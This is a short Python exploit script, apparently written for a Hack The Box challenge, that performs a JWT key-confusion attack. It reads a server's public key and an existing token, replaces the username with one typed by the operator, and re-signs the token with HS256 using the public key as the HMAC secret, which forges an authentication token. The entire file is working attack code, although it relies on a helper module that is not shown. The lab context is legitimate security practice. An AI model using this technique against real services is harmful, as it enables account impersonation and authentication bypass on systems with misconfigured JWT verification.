#!/usr/bin/env python3
"""
under_construction.py - Script to exploit the JWT key confusion vulnerability for this HTB machine.

Author: @raiabril
"""

import token_manipulation as token_manipulation

with open('src/web/samples/public.pk', 'rb') as key_file:
    public_key = key_file.read()

with open("src/web/samples/original_token.jwt", 'rb') as original_token_file:
    original_token = original_token_file.read()

print(f"[+] Original token: {original_token}")

original_token_payload = token_manipulation.get_token_payload(original_token,public_key, algorithm=['RS256'])

new_username = input("[+] New username: ")

new_token_payload = original_token_payload
new_token_payload['username'] = new_username

final_token = token_manipulation.create_token(new_token_payload, public_key, algorithm='HS256')

print(f"[+] Final token: {final_token}")